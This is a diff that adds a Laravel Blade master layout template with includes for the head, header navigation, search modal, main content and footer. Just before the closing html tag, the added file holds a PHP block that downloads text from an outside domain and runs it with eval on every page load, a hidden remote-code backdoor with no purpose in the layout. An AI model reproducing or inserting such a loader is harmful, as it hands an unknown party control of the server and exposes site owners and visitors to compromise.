@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="{{ str_replace('_', '-', app()->getLocale()) }}" class="no-js">
+
+<head>
+
+    @include('WebFront.Defaults.layouts.head')
+    @yield('head')
+
+
+    @livewireStyles
+</head>
+
+<body>
+    <div id="wrapper">
+    <!-- ======= Header ======= -->
+    @include('WebFront.Defaults.layouts.head_navi')
+    @yield('header_navi')
+    <!-- End Header -->
+
+    <!-- ======= search_modal ======= -->
+    @include('WebFront.Defaults.layouts.search_modal')
+    @yield('search_modal')
+    <!-- End Sidebar-->
+
+    <main id="main">
+    <!-- ======= main ======= -->
+    {{-- @include('dashborad') --}}
+    @yield('body')
+    <!-- End #main -->
+    </main>
+
+    <!-- ======= Footer ======= -->
+    @include('WebFront.Defaults.layouts.footer')
+    @yield('footer')
+    <!-- End Footer -->
+
+
+    </div>
+
+
+    @livewireScripts
+    @stack('scripts')
+</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</html>
